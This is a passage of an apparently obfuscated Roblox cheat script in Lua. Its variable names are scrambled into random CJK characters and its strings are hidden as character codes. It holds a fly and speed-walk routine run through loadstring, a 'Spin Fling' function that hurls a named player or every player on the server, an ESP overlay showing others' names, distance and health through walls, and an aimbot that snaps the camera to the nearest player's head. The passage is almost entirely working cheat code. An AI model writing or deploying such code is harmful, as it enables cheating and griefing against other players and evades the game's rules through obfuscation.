		旯榝糥珱唄瀑煓箵.cframe = 朠捏銠昊笵盗汃煓.CFrame
		local 鹪刉霸窱驉吶琮勎 = Instance.new(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121), 朠捏銠昊笵盗汃煓)
		鹪刉霸窱驉吶琮勎.velocity = Vector3.new(0,0.1,0)
		鹪刉霸窱驉吶琮勎.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			基婎躎皋蕋簀螺敥.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService(utf8.char(80, 108, 97, 121, 101, 114, 115)).憇菝龚描畒詃曒砤.Character.Humanoid.Health == 0 do
			wait()

			if 鳤佹粈腷羖牊鵜嫉.l + 鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿 ~= 0 or 鳤佹粈腷羖牊鵜嫉.f + 鳤佹粈腷羖牊鵜嫉.b ~= 0 then
				朷襡輳覗蘿绎燫薏 = 朷襡輳覗蘿绎燫薏+.5+(朷襡輳覗蘿绎燫薏/頽韕杳溋輭璮魩辚)
				if 朷襡輳覗蘿绎燫薏 > 頽韕杳溋輭璮魩辚 then
					朷襡輳覗蘿绎燫薏 = 頽韕杳溋輭璮魩辚
				end
			elseif not (鳤佹粈腷羖牊鵜嫉.l + 鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿 ~= 0 or 鳤佹粈腷羖牊鵜嫉.f + 鳤佹粈腷羖牊鵜嫉.b ~= 0) and 朷襡輳覗蘿绎燫薏 ~= 0 then
				朷襡輳覗蘿绎燫薏 = 朷襡輳覗蘿绎燫薏-1
				if 朷襡輳覗蘿绎燫薏 < 0 then
					朷襡輳覗蘿绎燫薏 = 0
				end
			end
			if (鳤佹粈腷羖牊鵜嫉.l + 鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿) ~= 0 or (鳤佹粈腷羖牊鵜嫉.f + 鳤佹粈腷羖牊鵜嫉.b) ~= 0 then
				鹪刉霸窱驉吶琮勎.velocity = ((game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame.lookVector * (鳤佹粈腷羖牊鵜嫉.f+鳤佹粈腷羖牊鵜嫉.b)) + ((game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame * CFrame.new(鳤佹粈腷羖牊鵜嫉.l+鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿,(鳤佹粈腷羖牊鵜嫉.f+鳤佹粈腷羖牊鵜嫉.b)*.2,0).p) - game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame.p))*朷襡輳覗蘿绎燫薏
				韅柲秕鐟暪煸鲮揅 = {f = 鳤佹粈腷羖牊鵜嫉.f, b = 鳤佹粈腷羖牊鵜嫉.b, l = 鳤佹粈腷羖牊鵜嫉.l, 捆郹賾曱怓凚湒炿 = 鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿}
			elseif (鳤佹粈腷羖牊鵜嫉.l + 鳤佹粈腷羖牊鵜嫉.捆郹賾曱怓凚湒炿) == 0 and (鳤佹粈腷羖牊鵜嫉.f + 鳤佹粈腷羖牊鵜嫉.b) == 0 and 朷襡輳覗蘿绎燫薏 ~= 0 then
				鹪刉霸窱驉吶琮勎.velocity = ((game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame.lookVector * (韅柲秕鐟暪煸鲮揅.f+韅柲秕鐟暪煸鲮揅.b)) + ((game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame * CFrame.new(韅柲秕鐟暪煸鲮揅.l+韅柲秕鐟暪煸鲮揅.捆郹賾曱怓凚湒炿,(韅柲秕鐟暪煸鲮揅.f+韅柲秕鐟暪煸鲮揅.b)*.2,0).p) - game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame.p))*朷襡輳覗蘿绎燫薏
			else
				鹪刉霸窱驉吶琮勎.velocity = Vector3.new(0,0,0)
			end

			旯榝糥珱唄瀑煓箵.cframe = game.榽拰繶篘瓙骻匠胳.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((鳤佹粈腷羖牊鵜嫉.f+鳤佹粈腷羖牊鵜嫉.b)*50*朷襡輳覗蘿绎燫薏/頽韕杳溋輭璮魩辚),0,0)
		end
		鳤佹粈腷羖牊鵜嫉 = {f = 0, b = 0, l = 0, 捆郹賾曱怓凚湒炿 = 0}
		韅柲秕鐟暪煸鲮揅 = {f = 0, b = 0, l = 0, 捆郹賾曱怓凚湒炿 = 0}
		朷襡輳覗蘿绎燫薏 = 0
		旯榝糥珱唄瀑煓箵:Destroy()
		鹪刉霸窱驉吶琮勎:Destroy()
		基婎躎皋蕋簀螺敥.Character.Humanoid.PlatformStand = false
		game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.Animate.Disabled = false
		tpwalking = false



	end





end)

local tis

萨鿶犟薂娴镈鞨禩.MouseButton1Down:connect(function()
	tis = 萨鿶犟薂娴镈鞨禩.MouseEnter:connect(function()
		while tis do
			wait()
			game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.HumanoidRootPart.CFrame = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.HumanoidRootPart.CFrame * CFrame.new(0,1,0)
		end
	end)
end)

萨鿶犟薂娴镈鞨禩.MouseLeave:connect(function()
	if tis then
		tis:Disconnect()
		tis = nil
	end
end)

local dis

缓榿巂裆汋剉薰尵.MouseButton1Down:connect(function()
	dis = 缓榿巂裆汋剉薰尵.MouseEnter:connect(function()
		while dis do
			wait()
			game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.HumanoidRootPart.CFrame = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.HumanoidRootPart.CFrame * CFrame.new(0,-1,0)
		end
	end)
end)

缓榿巂裆汋剉薰尵.MouseLeave:connect(function()
	if dis then
		dis:Disconnect()
		dis = nil
	end
end)


game:GetService(utf8.char(80, 108, 97, 121, 101, 114, 115)).憇菝龚描畒詃曒砤.CharacterAdded:Connect(function(偬冬摤秃猣帖鑠賰)
	wait(0.7)
	game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.Humanoid.PlatformStand = false
	game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character.Animate.Disabled = false

end)


耣腥柀墸闌璸诀煻.MouseButton1Down:connect(function()
	speeds = speeds + 1
	朷襡輳覗蘿绎燫薏.Text = speeds
	if nowe == true then


		tpwalking = false
		for i = 1, speeds do
			spawn(function()

				local 棴沌峩撊鎻聈鲊各 = game:GetService(utf8.char(82, 117, 110, 83, 101, 114, 118, 105, 99, 101)).Heartbeat	


				tpwalking = true
				local 綏翌滑娏臍僔萔共 = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character
				local 绠瘳饀秥鐏檶籅尨 = 綏翌滑娏臍僔萔共 and 綏翌滑娏臍僔萔共:FindFirstChildWhichIsA(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
				while tpwalking and 棴沌峩撊鎻聈鲊各:Wait() and 綏翌滑娏臍僔萔共 and 绠瘳饀秥鐏檶籅尨 and 绠瘳饀秥鐏檶籅尨.Parent do
					if 绠瘳饀秥鐏檶籅尨.MoveDirection.Magnitude > 0 then
						綏翌滑娏臍僔萔共:TranslateBy(绠瘳饀秥鐏檶籅尨.MoveDirection)
					end
				end

			end)
		end
	end
end)
墘帓訳淵貛餐煊懨.MouseButton1Down:connect(function()
	if speeds == 1 then
		朷襡輳覗蘿绎燫薏.Text = utf8.char(102, 108, 121, 110, 111, 49)
		wait(1)
		朷襡輳覗蘿绎燫薏.Text = speeds
	else
		speeds = speeds - 1
		朷襡輳覗蘿绎燫薏.Text = speeds
		if nowe == true then
			tpwalking = false
			for i = 1, speeds do
				spawn(function()

					local 棴沌峩撊鎻聈鲊各 = game:GetService(utf8.char(82, 117, 110, 83, 101, 114, 118, 105, 99, 101)).Heartbeat	


					tpwalking = true
					local 綏翌滑娏臍僔萔共 = game.雺咯尩面固牑蓪梧.憇菝龚描畒詃曒砤.Character
					local 绠瘳饀秥鐏檶籅尨 = 綏翌滑娏臍僔萔共 and 綏翌滑娏臍僔萔共:FindFirstChildWhichIsA(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
					while tpwalking and 棴沌峩撊鎻聈鲊各:Wait() and 綏翌滑娏臍僔萔共 and 绠瘳饀秥鐏檶籅尨 and 绠瘳饀秥鐏檶籅尨.Parent do
						if 绠瘳饀秥鐏檶籅尨.MoveDirection.Magnitude > 0 then
							綏翌滑娏臍僔萔共:TranslateBy(绠瘳饀秥鐏檶籅尨.MoveDirection)
						end
					end

				end)
			end
		end
	end
end)

烂憷桢餀鹹樊瘓貧.MouseButton1Click:Connect(function()
	鼣拀溥鷩試錱婾縳:Destroy()
end)

蠰仳荭逢躕痜硛涰.MouseButton1Click:Connect(function()
	萨鿶犟薂娴镈鞨禩.Visible = false
	缓榿巂裆汋剉薰尵.Visible = false
	鍹鵬娅液挿翹悊憔.Visible = false
	耣腥柀墸闌璸诀煻.Visible = false
	朷襡輳覗蘿绎燫薏.Visible = false
	墘帓訳淵貛餐煊懨.Visible = false
	蠰仳荭逢躕痜硛涰.Visible = false
	鳚舣碻矮達燵樷斪.Visible = true
	鼣拀溥鷩試錱婾縳.桊壱蠉椅徧鶶鵵鏲.BackgroundTransparency = 1
	烂憷桢餀鹹樊瘓貧.Position =  UDim2.new(0, 0, -1, 57)
end)

鳚舣碻矮達燵樷斪.MouseButton1Click:Connect(function()
	萨鿶犟薂娴镈鞨禩.Visible = true
	缓榿巂裆汋剉薰尵.Visible = true
	鍹鵬娅液挿翹悊憔.Visible = true
	耣腥柀墸闌璸诀煻.Visible = true
	朷襡輳覗蘿绎燫薏.Visible = true
	墘帓訳淵貛餐煊懨.Visible = true
	蠰仳荭逢躕痜硛涰.Visible = true
	鳚舣碻矮達燵樷斪.Visible = false
	鼣拀溥鷩試錱婾縳.桊壱蠉椅徧鶶鵵鏲.BackgroundTransparency = 0 
	烂憷桢餀鹹樊瘓貧.Position =  UDim2.new(0, 0, -1, 27)
end)
]=]

local function 虢挄亴肛餕崐别悴()
    -- 清理旧的飞行 GUI
    local 億掙蘇縏啁刏莦郬 = 憇菝龚描畒詃曒砤.PlayerGui:FindFirstChild(utf8.char(109, 97, 105, 110))
    if 億掙蘇縏啁刏莦郬 then 億掙蘇縏啁刏莦郬:Destroy() end
    -- 直接执行原始脚本
    loadstring(驺蘤疀氆謏縓釡蚒)()
end

local function 酆鏱粼旅隶躲蒹鄞()
    -- 停止飞行循环
    _G.nowe = false
    _G.tpwalking = false
    -- 销毁飞行 GUI
    local 宨树纉絉籲頩塾譜 = 憇菝龚描畒詃曒砤.PlayerGui:FindFirstChild(utf8.char(109, 97, 105, 110))
    if 宨树纉絉籲頩塾譜 then 宨树纉絉籲頩塾譜:Destroy() end
    -- 恢复角色状态
    local 偬冬摤秃猣帖鑠賰 = 憇菝龚描畒詃曒砤.Character
    local 绠瘳饀秥鐏檶籅尨 = 偬冬摤秃猣帖鑠賰 and 偬冬摤秃猣帖鑠賰:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
    if 绠瘳饀秥鐏檶籅尨 then
        绠瘳饀秥鐏檶籅尨.PlatformStand = false
        local 檃咄釟搠狲犪隿凐 = 偬冬摤秃猣帖鑠賰:FindFirstChild(utf8.char(65, 110, 105, 109, 97, 116, 101))
        if 檃咄釟搠狲犪隿凐 then 檃咄釟搠狲犪隿凐.Disabled = false end
    end
end

--========================================================
-- 甩飞别人 (Spin Fling)
--========================================================
local function 穦矢桀潙瞖舤盔鷹(targetName)
    local 矫蟪仠埚窗縈舧粓 = 雺咯尩面固牑蓪梧:FindFirstChild(targetName)
    if not 矫蟪仠埚窗縈舧粓 or not 矫蟪仠埚窗縈舧粓.Character then
        熱喫盥嫚杮歡傱萌(utf8.char(22833, 36133), utf8.char(30446, 26631, 29609, 23478, 19981, 21487, 29992), 3) return
    end
    local 殐尔暣櫷妸婴妬菜 = 矫蟪仠埚窗縈舧粓.Character:FindFirstChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116))
    local 约復幣緼嘵泙逰尭 = 葰疀嗂枥訷薠蕠龵()
    if not 殐尔暣櫷妸婴妬菜 or not 约復幣緼嘵泙逰尭 then return end

    local 襭櫋眔暥錛磟錗砸 = 约復幣緼嘵泙逰尭.CFrame
    local 鳀夐瓷耱孯闝大坒 = Instance.new(utf8.char(66, 111, 100, 121, 65, 110, 103, 117, 108, 97, 114, 86, 101, 108, 111, 99, 105, 116, 121))
    鳀夐瓷耱孯闝大坒.AngularVelocity = Vector3.new(0, 99999, 0)
    鳀夐瓷耱孯闝大坒.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
    鳀夐瓷耱孯闝大坒.Parent = 约復幣緼嘵泙逰尭

    local 鹪刉霸窱驉吶琮勎 = Instance.new(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121))
    鹪刉霸窱驉吶琮勎.Velocity = Vector3.zero
    鹪刉霸窱驉吶琮勎.MaxForce = Vector3.new(1e9, 1e9, 1e9)
    鹪刉霸窱驉吶琮勎.Parent = 约復幣緼嘵泙逰尭

    -- 靠近目标并旋转
    约復幣緼嘵泙逰尭.CFrame = 殐尔暣櫷妸婴妬菜.CFrame + Vector3.new(0, 0, 0)
    task.wait(0.5)

    鳀夐瓷耱孯闝大坒:Destroy()
    鹪刉霸窱驉吶琮勎:Destroy()
    约復幣緼嘵泙逰尭.CFrame = 襭櫋眔暥錛磟錗砸
    熱喫盥嫚杮歡傱萌(utf8.char(29993, 39134), utf8.char(24050, 29993, 39134, 32) .. targetName, 3)
end

local 嬐腑揇珢杅顊巛柣 = false
local function 羌鞄垕覭驖蒼运懾()
    if 嬐腑揇珢杅顊巛柣 then return end
    嬐腑揇珢杅顊巛柣 = true
    local 鴂挙埘撌樃降卩鞭 = 0
    熱喫盥嫚杮歡傱萌(utf8.char(29993, 39134, 25152, 26377, 20154), utf8.char(24320, 22987, 29993, 39134, 26381, 21153, 22120, 20869, 25152, 26377, 29609, 23478, 46, 46, 46), 3)
    local 约復幣緼嘵泙逰尭 = 葰疀嗂枥訷薠蕠龵()
    if not 约復幣緼嘵泙逰尭 then 嬐腑揇珢杅顊巛柣 = false return end
    local 襭櫋眔暥錛磟錗砸 = 约復幣緼嘵泙逰尭.CFrame

    for _, p in ipairs(雺咯尩面固牑蓪梧:GetPlayers()) do
        if p ~= 憇菝龚描畒詃曒砤 and p.Character then
            local 殐尔暣櫷妸婴妬菜 = p.Character:FindFirstChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116))
            local 嵋焚籣毧灈邰太襙 = p.Character:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
            if 殐尔暣櫷妸婴妬菜 and 嵋焚籣毧灈邰太襙 and 嵋焚籣毧灈邰太襙.Health > 0 then
                local 鳀夐瓷耱孯闝大坒 = Instance.new(utf8.char(66, 111, 100, 121, 65, 110, 103, 117, 108, 97, 114, 86, 101, 108, 111, 99, 105, 116, 121))
                鳀夐瓷耱孯闝大坒.AngularVelocity = Vector3.new(0, 99999, 0)
                鳀夐瓷耱孯闝大坒.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
                鳀夐瓷耱孯闝大坒.Parent = 约復幣緼嘵泙逰尭

                local 鹪刉霸窱驉吶琮勎 = Instance.new(utf8.char(66, 111, 100, 121, 86, 101, 108, 111, 99, 105, 116, 121))
                鹪刉霸窱驉吶琮勎.Velocity = Vector3.zero
                鹪刉霸窱驉吶琮勎.MaxForce = Vector3.new(1e9, 1e9, 1e9)
                鹪刉霸窱驉吶琮勎.Parent = 约復幣緼嘵泙逰尭

                约復幣緼嘵泙逰尭.CFrame = 殐尔暣櫷妸婴妬菜.CFrame
                task.wait(0.3)

                鳀夐瓷耱孯闝大坒:Destroy()
                鹪刉霸窱驉吶琮勎:Destroy()
                约復幣緼嘵泙逰尭.CFrame = 襭櫋眔暥錛磟錗砸
                鴂挙埘撌樃降卩鞭 = 鴂挙埘撌樃降卩鞭 + 1
                task.wait(0.1)
            end
        end
    end

    嬐腑揇珢杅顊巛柣 = false
    熱喫盥嫚杮歡傱萌(utf8.char(29993, 39134, 23436, 25104), utf8.char(20849, 29993, 39134, 32) .. 鴂挙埘撌樃降卩鞭 .. utf8.char(32, 21517, 29609, 23478), 5)
end

--========================================================
-- ESP (精简版)
--========================================================
local 橬詤缼便諶休墜毜 = {}

local function 嬮凡珎歾圾鉰補掳(player)
    if player == 憇菝龚描畒詃曒砤 then return end
    local function 宗鵢嫢巎槠蚔綵嬉(偬冬摤秃猣帖鑠賰)
        if not 偬冬摤秃猣帖鑠賰 then return end
        local 敊祤斕端竽悬岍潆 = 偬冬摤秃猣帖鑠賰:FindFirstChild(utf8.char(72, 101, 97, 100)) or 偬冬摤秃猣帖鑠賰:WaitForChild(utf8.char(72, 101, 97, 100), 5)
        local 找坍絹鯻拫敾闋祟 = 偬冬摤秃猣帖鑠賰:FindFirstChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116)) or 偬冬摤秃猣帖鑠賰:WaitForChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116), 5)
        local 绠瘳饀秥鐏檶籅尨 = 偬冬摤秃猣帖鑠賰:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
        if not 敊祤斕端竽悬岍潆 then return end

        if 橬詤缼便諶休墜毜[player] then
            for _, v in pairs(橬詤缼便諶休墜毜[player]) do
                if v and v.Destroy then pcall(function() v:Destroy() end) end
            end
        end

        local 桯癄朋聪鱄匂驠鿀 = Instance.new(utf8.char(66, 105, 108, 108, 98, 111, 97, 114, 100, 71, 117, 105))
        桯癄朋聪鱄匂驠鿀.Name = utf8.char(69, 83, 80)
        桯癄朋聪鱄匂驠鿀.Adornee = 敊祤斕端竽悬岍潆
        桯癄朋聪鱄匂驠鿀.Size = UDim2.new(0, 200, 0, 50)
        桯癄朋聪鱄匂驠鿀.StudsOffset = Vector3.new(0, 2.5, 0)
        桯癄朋聪鱄匂驠鿀.AlwaysOnTop = true
        桯癄朋聪鱄匂驠鿀.Enabled = 逬貋祝臞噫檿轓谼.ESPEnabled

        local 曟諭郞恬夛塮頻秐 = Instance.new(utf8.char(84, 101, 120, 116, 76, 97, 98, 101, 108))
        曟諭郞恬夛塮頻秐.BackgroundTransparency = 1
        曟諭郞恬夛塮頻秐.Size = UDim2.new(1, 0, 0, 20)
        曟諭郞恬夛塮頻秐.Font = Enum.Font.GothamBold
        曟諭郞恬夛塮頻秐.TextSize = 14
        曟諭郞恬夛塮頻秐.TextColor3 = Color3.fromRGB(255, 80, 80)
        曟諭郞恬夛塮頻秐.TextStrokeTransparency = 0
        曟諭郞恬夛塮頻秐.Text = player.Name
        曟諭郞恬夛塮頻秐.Parent = 桯癄朋聪鱄匂驠鿀

        local 琣極燣韯臘烫莍宨 = Instance.new(utf8.char(84, 101, 120, 116, 76, 97, 98, 101, 108))
        琣極燣韯臘烫莍宨.BackgroundTransparency = 1
        琣極燣韯臘烫莍宨.Size = UDim2.new(1, 0, 0, 16)
        琣極燣韯臘烫莍宨.Position = UDim2.new(0, 0, 0, 20)
        琣極燣韯臘烫莍宨.Font = Enum.Font.Gotham
        琣極燣韯臘烫莍宨.TextSize = 12
        琣極燣韯臘烫莍宨.TextColor3 = Color3.fromRGB(200, 200, 200)
        琣極燣韯臘烫莍宨.TextStrokeTransparency = 0.5
        琣極燣韯臘烫莍宨.Text = utf8.char()
        琣極燣韯臘烫莍宨.Parent = 桯癄朋聪鱄匂驠鿀
        桯癄朋聪鱄匂驠鿀.Parent = 敊祤斕端竽悬岍潆

        local 备谔譝崭轊楰蔐兆 = Instance.new(utf8.char(72, 105, 103, 104, 108, 105, 103, 104, 116))
        备谔譝崭轊楰蔐兆.Adornee = 偬冬摤秃猣帖鑠賰
        备谔譝崭轊楰蔐兆.FillColor = Color3.fromRGB(255, 80, 80)
        备谔譝崭轊楰蔐兆.FillTransparency = 0.8
        备谔譝崭轊楰蔐兆.OutlineColor = Color3.fromRGB(255, 255, 255)
        备谔譝崭轊楰蔐兆.Enabled = 逬貋祝臞噫檿轓谼.ESPEnabled
        备谔譝崭轊楰蔐兆.Parent = 偬冬摤秃猣帖鑠賰

        橬詤缼便諶休墜毜[player] = {桯癄朋聪鱄匂驠鿀 = 桯癄朋聪鱄匂驠鿀, 备谔譝崭轊楰蔐兆 = 备谔譝崭轊楰蔐兆, 琣極燣韯臘烫莍宨 = 琣極燣韯臘烫莍宨, 找坍絹鯻拫敾闋祟 = 找坍絹鯻拫敾闋祟, 绠瘳饀秥鐏檶籅尨 = 绠瘳饀秥鐏檶籅尨}

        task.spawn(function()
            while 橬詤缼便諶休墜毜[player] and 偬冬摤秃猣帖鑠賰 and 偬冬摤秃猣帖鑠賰.Parent do
                local 竸偂苎潕废罱椉襧 = 橬詤缼便諶休墜毜[player]
                if not 竸偂苎潕废罱椉襧 then break end
                local 约復幣緼嘵泙逰尭 = 葰疀嗂枥訷薠蕠龵()
                if 竸偂苎潕废罱椉襧.找坍絹鯻拫敾闋祟 and 约復幣緼嘵泙逰尭 then
                    local 頋縨鎎馬莸鵢幚伈 = math.floor((竸偂苎潕废罱椉襧.找坍絹鯻拫敾闋祟.Position - 约復幣緼嘵泙逰尭.Position).Magnitude)
                    local 絊臀鸅扇灵貙私氫 = 竸偂苎潕废罱椉襧.绠瘳饀秥鐏檶籅尨 and math.floor(竸偂苎潕废罱椉襧.绠瘳饀秥鐏檶籅尨.Health) or utf8.char(63)
                    竸偂苎潕废罱椉襧.琣極燣韯臘烫莍宨.Text = 頋縨鎎馬莸鵢幚伈 .. utf8.char(109, 32, 32, 72, 80, 58) .. 絊臀鸅扇灵貙私氫
                end
                task.wait(0.15)
            end
        end)
    end
    if player.Character then 宗鵢嫢巎槠蚔綵嬉(player.Character) end
    player.CharacterAdded:Connect(宗鵢嫢巎槠蚔綵嬉)
end

local function 盼誅锒諳嗽乷卄垓(player)
    if 橬詤缼便諶休墜毜[player] then
        for _, v in pairs(橬詤缼便諶休墜毜[player]) do
            if v and v.Destroy then pcall(function() v:Destroy() end) end
        end
        橬詤缼便諶休墜毜[player] = nil
    end
end

local 驉橫脾支箶披跌弥 = false
local function 龉兲訴麩飋蘢帶哪()
    if 驉橫脾支箶披跌弥 then return end
    驉橫脾支箶披跌弥 = true
    for _, p in ipairs(雺咯尩面固牑蓪梧:GetPlayers()) do 嬮凡珎歾圾鉰補掳(p) end
    雺咯尩面固牑蓪梧.PlayerAdded:Connect(嬮凡珎歾圾鉰補掳)
    雺咯尩面固牑蓪梧.PlayerRemoving:Connect(盼誅锒諳嗽乷卄垓)
end

--========================================================
-- 玩家列表工具
--========================================================
local function 牂褫拮迱愽办擈樫()
    local 坸飭廲楍鬇騇冩氾 = {}
    for _, p in ipairs(雺咯尩面固牑蓪梧:GetPlayers()) do
        if p ~= 憇菝龚描畒詃曒砤 then table.insert(坸飭廲楍鬇騇冩氾, p.Name) end
    end
    return 坸飭廲楍鬇騇冩氾
end

--========================================================
-- 自瞄系统 (Aimbot)
--========================================================
local 覍掼絋轊讍猱僪鋸 = nil
local 慞襭擳讴颹馽葆碲 = nil

-- 创建/更新 FOV 圆圈
local function 鏹鉥則躡蒟鍱聭韪()
    if 逬貋祝臞噫檿轓谼.ShowFOV then
        if not 覍掼絋轊讍猱僪鋸 then
            覍掼絋轊讍猱僪鋸 = Instance.new(utf8.char(80, 97, 114, 116))
            覍掼絋轊讍猱僪鋸.Name = utf8.char(70, 79, 86, 67, 105, 114, 99, 108, 101)
            覍掼絋轊讍猱僪鋸.Shape = Enum.PartType.Cylinder
            覍掼絋轊讍猱僪鋸.Material = Enum.Material.ForceField
            覍掼絋轊讍猱僪鋸.Color = Color3.fromRGB(255, 255, 255)
            覍掼絋轊讍猱僪鋸.Transparency = 0.5
            覍掼絋轊讍猱僪鋸.Anchored = true
            覍掼絋轊讍猱僪鋸.CanCollide = false
            覍掼絋轊讍猱僪鋸.CanQuery = false
            覍掼絋轊讍猱僪鋸.CastShadow = false
            覍掼絋轊讍猱僪鋸.Parent = 榽拰繶篘瓙骻匠胳
        end
        -- 用 诂湽牆刵犛琗冓鸐 画圆更准确
        覍掼絋轊讍猱僪鋸.Transparency = 1
        local 宨树纉絉籲頩塾譜 = game:GetService(utf8.char(67, 111, 114, 101, 71, 117, 105)):FindFirstChild(utf8.char(65, 105, 109, 98, 111, 116, 70, 79, 86))
        if not 宨树纉絉籲頩塾譜 then
            宨树纉絉籲頩塾譜 = Instance.new(utf8.char(83, 99, 114, 101, 101, 110, 71, 117, 105))
            宨树纉絉籲頩塾譜.Name = utf8.char(65, 105, 109, 98, 111, 116, 70, 79, 86)
            宨树纉絉籲頩塾譜.ResetOnSpawn = false
            宨树纉絉籲頩塾譜.Parent = game:GetService(utf8.char(67, 111, 114, 101, 71, 117, 105))
        end
        local 櫨鶻氉痌狭筵隆犪 = 宨树纉絉籲頩塾譜:FindFirstChild(utf8.char(67, 105, 114, 99, 108, 101))
        if not 櫨鶻氉痌狭筵隆犪 then
            櫨鶻氉痌狭筵隆犪 = Instance.new(utf8.char(70, 114, 97, 109, 101))
            櫨鶻氉痌狭筵隆犪.Name = utf8.char(67, 105, 114, 99, 108, 101)
            櫨鶻氉痌狭筵隆犪.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            櫨鶻氉痌狭筵隆犪.BackgroundTransparency = 1
            櫨鶻氉痌狭筵隆犪.BorderSizePixel = 0
            櫨鶻氉痌狭筵隆犪.Parent = 宨树纉絉籲頩塾譜
            local 杈錐醋螆欐卻嬌嬫 = Instance.new(utf8.char(85, 73, 67, 111, 114, 110, 101, 114))
            杈錐醋螆欐卻嬌嬫.CornerRadius = UDim.new(1, 0)
            杈錐醋螆欐卻嬌嬫.Parent = 櫨鶻氉痌狭筵隆犪
            local 姷傲僾丷泟捔阯藂 = Instance.new(utf8.char(85, 73, 83, 116, 114, 111, 107, 101))
            姷傲僾丷泟捔阯藂.Name = utf8.char(83, 116, 114, 111, 107, 101)
            姷傲僾丷泟捔阯藂.Color = Color3.fromRGB(0, 255, 100)
            姷傲僾丷泟捔阯藂.Thickness = 1.5
            姷傲僾丷泟捔阯藂.Transparency = 0.3
            姷傲僾丷泟捔阯藂.Parent = 櫨鶻氉痌狭筵隆犪
        end
        櫨鶻氉痌狭筵隆犪.Visible = true
    else
        local 宨树纉絉籲頩塾譜 = game:GetService(utf8.char(67, 111, 114, 101, 71, 117, 105)):FindFirstChild(utf8.char(65, 105, 109, 98, 111, 116, 70, 79, 86))
        if 宨树纉絉籲頩塾譜 then
            local 櫨鶻氉痌狭筵隆犪 = 宨树纉絉籲頩塾譜:FindFirstChild(utf8.char(67, 105, 114, 99, 108, 101))
            if 櫨鶻氉痌狭筵隆犪 then 櫨鶻氉痌狭筵隆犪.Visible = false end
        end
    end
end

-- 找到屏幕中心 FOV 范围内最近的玩家
local function 埽犮煕檡吸駤鹲姀()
    local 籏卖嚫莤戴碕侉躸 = nil
    local 脺乸欓媝壌矀囍事 = 逬貋祝臞噫檿轓谼.AimbotFOV
    local 眾塂燗鎌孾涞戞曩 = Vector2.new(歮埡诘揶蛄蘵洽愳.ViewportSize.X / 2, 歮埡诘揶蛄蘵洽愳.ViewportSize.Y / 2)

    for _, p in ipairs(雺咯尩面固牑蓪梧:GetPlayers()) do
        if p ~= 憇菝龚描畒詃曒砤 and p.Character then
            local 敊祤斕端竽悬岍潆 = p.Character:FindFirstChild(utf8.char(72, 101, 97, 100))
            local 绠瘳饀秥鐏檶籅尨 = p.Character:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
            if 敊祤斕端竽悬岍潆 and 绠瘳饀秥鐏檶籅尨 and 绠瘳饀秥鐏檶籅尨.Health > 0 then
                local 嵇鵛闉嵫阒噤返踝, onScreen = 歮埡诘揶蛄蘵洽愳:WorldToViewportPoint(敊祤斕端竽悬岍潆.Position)
                if onScreen then
                    local 鷖霪庡垾軘敟吰牘 = (Vector2.new(嵇鵛闉嵫阒噤返踝.X, 嵇鵛闉嵫阒噤返踝.Y) - 眾塂燗鎌孾涞戞曩).Magnitude
                    if 鷖霪庡垾軘敟吰牘 < 脺乸欓媝壌矀囍事 then
                        脺乸欓媝壌矀囍事 = 鷖霪庡垾軘敟吰牘
                        籏卖嚫莤戴碕侉躸 = p
                    end
                end
            end
        end
    end
    return 籏卖嚫莤戴碕侉躸
end

local function 鳨绥鑂樛鐥厮凣瑶()
    慞襭擳讴颹馽葆碲 = 犄瞕炿詑碐糡圃曎.RenderStepped:Connect(function()
        if not 逬貋祝臞噫檿轓谼.Aimbot then return end

        -- 手机端: 默认开启就自瞄; 键盘端: 按住右键才自瞄
        local 征掜燀轩馂讵塜鑗 = true
        if 逬貋祝臞噫檿轓谼.AimbotKey then
            征掜燀轩馂讵塜鑗 = 氟崹攻鏗覻蟭胺跌:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
        end

        if not 征掜燀轩馂讵塜鑗 then return end

        local 矫蟪仠埚窗縈舧粓 = 埽犮煕檡吸駤鹲姀()
        if 矫蟪仠埚窗縈舧粓 and 矫蟪仠埚窗縈舧粓.Character then
